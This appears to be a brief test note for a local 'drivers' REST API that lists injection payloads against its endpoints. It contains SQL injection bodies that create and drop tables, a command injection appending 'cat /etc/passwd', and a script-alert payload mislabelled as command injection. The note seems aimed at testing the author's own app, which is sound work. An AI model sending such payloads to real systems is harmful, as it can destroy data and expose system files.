INPUT SQL INJECTION CREATE TABLE
```
ENDPOINT: POST /drivers
{
  "driver_id": 30,
  "driver_license": "string', 'string', 'string'); CREATE TABLE malicious_table (id INT);--",
  "driver_name": "string",
  "home_town": "string"
}
```



INPUT SQL INJECTION DROP TABLE
```
ENDPOINT: POST /drivers
{
  "driver_id": 31,
  "driver_license": "string', 'string', 'string'); DROP TABLE malicious_table;--",
  "driver_name": "string",
  "home_town": "string"
}
```

PREVENT SQL INJECTION USE GORM AND VERIFY PARAMEtER
```
ENDPOINT: PUT /drivers/1
{
  "driver_id": 1,
  "driver_license": "string",
  "driver_name": "string",
  "home_town": "string'); DROP TABLE malicious_table;--"
}
```

OS COMMAND INJECTION - Show all password in server
```
ENDPOINT: GET /list/path=controller;cat /etc/passwd
```

CODE COMMAND INJECTION 

```
ENDPOINT: http://localhost:8080/show?input=data%3Cscript%3Ealert(%22You%20have%20been%20hacked%22)%3C/script%3E
```